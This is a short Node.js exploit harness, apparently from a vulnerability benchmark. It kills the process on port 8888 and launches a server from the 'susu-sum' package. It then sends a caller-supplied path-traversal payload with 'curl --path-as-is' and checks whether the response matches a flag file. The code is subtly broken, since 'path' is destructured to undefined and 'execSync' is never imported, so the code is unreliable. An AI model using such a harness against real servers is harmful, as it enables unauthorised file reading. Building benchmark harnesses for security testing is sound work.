function exploitFunction(payload) {
  const { path } = require("path");  // Import the path module
  const { sleep } = require("sleep");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  const fs = require("fs");
  const hostsFile = fs.readFileSync(pathToFlag).toString();

  const { exec } = require("child_process");
  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  const server = "node ./node_modules/susu-sum/node.js";
  exec(server, (error, stdout) => {
    sleep.sleep(2);

    const attack_string = `curl -v --path-as-is "http://127.0.1.1:8888${payload}"`;
    exec(attack_string, (error, stdout) => {
      if (stdout === hostsFile) {
        console.log("Exploit successful!");
      } else {
        console.error("Exploit failed.");
      }
    });
  });
}

module.exports = { exploitFunction };